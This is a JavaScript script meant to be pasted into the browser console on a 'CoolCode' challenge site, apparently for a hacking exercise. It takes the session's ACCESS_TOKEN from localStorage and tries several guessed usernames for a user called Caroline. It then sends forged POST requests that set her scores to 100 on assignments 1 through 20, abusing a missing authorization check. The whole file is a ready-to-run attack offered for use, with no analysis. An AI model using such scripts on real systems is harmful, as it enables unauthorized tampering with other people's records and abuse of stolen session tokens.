// COPY AND PASTE THIS ENTIRE SCRIPT INTO THE BROWSER CONSOLE
// while on https://coolcode-hacker-34c5455cd908.herokuapp.com

console.log("🚀 CoolCode Challenge Hack Script");
console.log("================================");

// Get the ACCESS_TOKEN from localStorage
const token = localStorage.getItem('ACCESS_TOKEN');
if (!token) {
    console.error("❌ No ACCESS_TOKEN found in localStorage!");
    console.log("Make sure you're logged in to CoolCode first.");
} else {
    console.log("✅ Found ACCESS_TOKEN:", token.substring(0, 20) + "...");
}

// Function to hack a single assignment
async function hackAssignment(username, assignmentId, score) {
    const url = '/api/api/assignment/score';
    
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'ACCESS_TOKEN': token
            },
            body: JSON.stringify({
                username: username,
                assignmentId: assignmentId,
                score: score
            })
        });
        
        const result = await response.text();
        return {
            success: response.ok,
            status: response.status,
            response: result
        };
    } catch (error) {
        return {
            success: false,
            error: error.message
        };
    }
}

// Function to test different usernames for Caroline
async function findCarolineUsername() {
    console.log("\n🔍 Testing different usernames for Caroline...");
    
    const possibleUsernames = [
        '98ixul',
        'Caroline', 
        'caroline',
        'CAROLINE',
        'Caroline_98ixul',
        '98ixul_Caroline'
    ];
    
    for (const username of possibleUsernames) {
        console.log(`Testing username: ${username}`);
        const result = await hackAssignment(username, 1, 100);
        
        if (result.success) {
            console.log(`✅ SUCCESS! Caroline's username is: ${username}`);
            return username;
        } else {
            console.log(`❌ Failed (${result.status}): ${result.response || result.error}`);
        }
        
        // Small delay between attempts
        await new Promise(resolve => setTimeout(resolve, 500));
    }
    
    console.log("❌ No working username found for Caroline");
    return null;
}

// Function to hack all assignments for Caroline
async function hackAllAssignments(username) {
    console.log(`\n🚀 Hacking all assignments for ${username}...`);
    
    let successCount = 0;
    
    for (let assignmentId = 1; assignmentId <= 20; assignmentId++) {
        const result = await hackAssignment(username, assignmentId, 100);
        
        if (result.success) {
            console.log(`✅ Assignment ${assignmentId}: SUCCESS!`);
            successCount++;
        } else {
            console.log(`❌ Assignment ${assignmentId}: Failed (${result.status})`);
        }
        
        // Small delay between requests
        await new Promise(resolve => setTimeout(resolve, 300));
    }
    
    console.log(`\n🎉 Successfully hacked ${successCount} assignments!`);
    return successCount;
}

// Main execution
async function main() {
    if (!token) return;
    
    // Test 1: Try to find Caroline's correct username
    const carolineUsername = await findCarolineUsername();
    
    if (carolineUsername) {
        // Test 2: If we found it, hack all assignments
        const hackedCount = await hackAllAssignments(carolineUsername);
        
        if (hackedCount > 0) {
            console.log("\n🎉 CHALLENGE COMPLETION SUMMARY:");
            console.log(`✅ Successfully modified ${hackedCount} assignments for Caroline`);
            console.log("✅ This should complete 60% of the CoolCode challenge!");
        }
    } else {
        console.log("\n💡 TROUBLESHOOTING SUGGESTIONS:");
        console.log("1. Make sure you're logged in to CoolCode");
        console.log("2. Try refreshing the page and running the script again");
        console.log("3. Check if Caroline's username is different in the UI");
        console.log("4. The API might have additional security measures");
    }
}

// Start the hack!
console.log("\n⚡ Starting hack in 2 seconds...");
setTimeout(main, 2000);
